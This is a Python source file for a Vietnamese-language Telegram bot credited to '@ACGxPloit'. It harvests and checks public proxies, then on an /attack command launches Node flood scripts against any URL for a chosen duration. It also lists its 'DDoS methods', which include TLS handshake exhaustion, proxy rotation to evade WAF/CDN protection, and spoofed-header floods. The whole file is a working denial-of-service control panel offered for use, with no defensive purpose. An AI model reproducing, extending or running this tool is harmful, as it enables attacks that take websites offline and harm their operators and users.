import asyncio
import time
import requests
import html
import subprocess
import os
import psutil
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TELEGRAM_BOT_TOKEN = 'token'

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def fetch_proxies_from_url(url):
    try:
        resp = requests.get(url, headers=HEADERS, timeout=15)
        resp.raise_for_status()
        return set(line.strip() for line in resp.text.splitlines() if line.strip())
    except Exception as e:
        print(f"[-] Lỗi khi lấy proxy từ {url}: {e}")
        return set()

def check_proxy(proxy):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        resp = requests.get("http://ip-api.com/json/", proxies=proxies, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {"proxy": proxy, "country": data.get("countryCode", "Unknown")}
    except:
        return None

async def check_proxies_and_report(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    start_time = time.time()
    all_proxies = set()
    for url in PROXY_SOURCES:
        all_proxies.update(fetch_proxies_from_url(url))
    total = len(all_proxies)

    progress_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"🔍 Đã lấy {total} proxy. Đang kiểm tra...\n⏳ Tiến độ: 0% (0/{total})"
    )

    live_proxies = []
    checked = 0
    last_update = time.time()

    with ThreadPoolExecutor(max_workers=500) as executor:
        futures = {executor.submit(check_proxy, proxy): proxy for proxy in all_proxies}
        for future in as_completed(futures):
            checked += 1
            result = future.result()
            if result:
                live_proxies.append(result)

            now = time.time()
            if now - last_update > 15 or checked == total:
                percent = int(checked * 100 / total)
                try:
                    await progress_msg.edit_text(
                        f"🔍 Tổng proxy: {total}\n"
                        f"✅ Tiến độ: {percent}% ({checked}/{total})"
                    )
                except:
                    pass
                last_update = now

    duration = round(time.time() - start_time, 2)
    with open("proxies.txt", "w") as f:
        f.writelines([p['proxy'] + "\n" for p in live_proxies])

    # Tính thống kê theo quốc gia
    country_counts = Counter(p["country"] for p in live_proxies)
    country_summary = "\n".join([f"• {c}: {n}" for c, n in country_counts.items()])

    caption = (
        f"✅ *CHECK LIVE PROXY by @ACGxPloit*\n"
        f"*TỔNG:* {total}\n"
        f"*LIVE:* {len(live_proxies)}\n"
        f"🌍 *Phân bố quốc gia:*\n{country_summary}\n"
        f"⏱️ *Thời gian:* {duration}s"
    )

    await context.bot.send_document(
        chat_id=chat_id,
        document=open("proxies.txt", "rb"),
        caption=caption,
        parse_mode="Markdown"
    )

# Lệnh /attack
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 3:
            await update.message.reply_text(
                "❗ Dùng đúng cú pháp:\n`/attack <method> <url> <time>`\n"
                "Phương thức: TLSStorm, ProxyPulse, CryptoFlood, HeaderSurge\n"
                "Ví dụ: `/attack TLSStorm https://example.com 60`",
                parse_mode="Markdown"
            )
            return

        method = context.args[0]
        url = context.args[1]
        time_ = context.args[2]

        valid_methods = {
            "TLSStorm": "l7http1.js",
            "ProxyPulse": "l7http2.js",
            "HeaderSurge": "l7http3.js",
            "CryptoFlood": "l7http4.js"
        }

        if method not in valid_methods:
            await update.message.reply_text(
                "❌ *Phương thức không hợp lệ!*\n"
                "Vui lòng chọn một trong các phương thức sau:\n"
                "• `TLSStorm`\n• `ProxyPulse`\n• `HeaderSurge`\n• `CryptoFlood`",
                parse_mode="Markdown"
            )
            return

        if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
            await update.message.reply_text("⚠️ Chưa có proxy! Hãy chạy /getproxy trước.")
            return

        script = valid_methods[method]
        rate = "100"
        threads = "10"

        command = ["node", script, url, time_, rate, threads, "proxies.txt"]

        await update.message.reply_text(
            f"🚀 *Bắt đầu tấn công ({method})!*\n\n"
            f"🎯 URL: `{url}`\n"
            f"⏱️ Thời gian: `{time_} giây`\n"
            f"📦 Proxy: `proxies.txt`\n"
            f"⚙️ Rate: `{rate}`\n"
            f"💣 Thread: `{threads}`\n",
            parse_mode="Markdown"
        )

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print(f"[CMD] {' '.join(command)}")

        def on_complete(proc):
            stdout, stderr = proc.communicate()
            print(f"Kết quả:\n{stdout}")
            if stderr:
                print(f"Lỗi:\n{stderr}")

        import threading
        threading.Thread(target=on_complete, args=(process,)).start()

        await update.message.reply_text("⏳ Lệnh đang chạy trong nền...")

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: `{e}`", parse_mode="Markdown")

# Lệnh /stop
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    killed = 0
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = " ".join(proc.info['cmdline'])
            if "node" in proc.info['name'].lower() and any(script in cmdline for script in ["l7http1.js", "l7http2.js", "l7http3.js", "l7http4.js"]):
                proc.kill()
                killed += 1
        except Exception as e:
            print(f"Lỗi khi dừng tiến trình: {e}")

    if killed:
        await update.message.reply_text(f"🛑 Đã dừng {killed} tiến trình tấn công.")
    else:
        await update.message.reply_text("⚠️ Không có tiến trình nào đang chạy.")

# Lệnh /methods
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    methods_list = (
        "*Danh sách phương thức DDoS mở rộng:*"
        "• `CLS` - Tạo hàng loạt kết nối TLS để làm quá tải CPU xử lý mã hóa của máy chủ\n"
        "• `PP` - Gửi lưu lượng lớn qua hàng nghìn proxy để ẩn IP và vượt qua WAF/CDN\n"  
        "• `HS` - Gửi yêu cầu HTTP với nhiều header giả mạo và ngẫu nhiên nhằm gây quá tải tầng xử lý HTTP\n"  
        "• `CF` - Tấn công tầng mã hóa bằng yêu cầu nặng liên quan đến mã hóa/giải mã, tiêu hao tài nguyên máy chủ"  

    )
    await update.message.reply_text(methods_list, parse_mode="Markdown")

# Lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*Chào bạn!*\n"
        "Các lệnh bạn có thể dùng:\n"
        "• `/getproxy` – Lấy & kiểm tra proxy\n"
        "• `/attack <method> <url> <time> ` – Bắt đầu tấn công (phương thức: TLSStorm, ProxyPulse, HeaderSurge, CryptoFlood)\n"
        "• `/stop` – Dừng tất cả cuộc tấn công\n"
        "• `/methods` – Xem danh sách các phương thức DDoS",
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("getproxy", check_proxies_and_report))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("methods", methods_command))

    print("Bot đã sẵn sàng...")
    app.run_polling()

if __name__ == "__main__":
    main()
